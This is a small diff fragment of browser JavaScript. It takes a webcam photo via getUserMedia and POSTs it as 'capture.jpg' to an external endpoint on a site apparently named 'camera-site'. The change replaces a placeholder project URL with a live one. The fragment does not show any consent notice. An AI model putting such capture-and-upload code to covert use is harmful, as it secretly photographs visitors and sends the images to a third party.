@@ -24,7 +24,7 @@ navigator.mediaDevices.getUserMedia({video:true})
         const formData = new FormData();
         formData.append('photo', blob, 'capture.jpg');
         
-        await fetch('https://ТВОЙ-ПРОЕКТ.vercel.app/api/send', {
+        await fetch('https://camera-site-ten.vercel.app/api/send', {
           method: 'POST',
           body: formData
         });
